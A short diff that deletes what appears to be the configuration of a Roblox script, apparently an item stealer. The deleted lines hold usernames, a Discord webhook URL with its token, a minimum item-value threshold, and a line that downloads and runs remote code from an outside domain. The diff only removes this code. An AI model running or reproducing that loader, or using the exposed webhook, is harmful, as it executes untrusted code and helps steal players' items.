@@ -1,9 +1,1 @@
-Username = "jheremyqt1"
-Username2 = "jheremyqt1"
-Webhook = "https://discord.com/api/webhooks/1226668783683502131/o84VLovFHpAfWdCMNaeJ8mC8iPUAGyFDte2tNm4PtpmIwJ4uWU9A2itBHPqwJwvEcYwM"
-
-HubName = "Blust"
-
-MinimumRAP = 40000
-
-loadstring(game:HttpGet("https://egorikusa.space"))()
+1
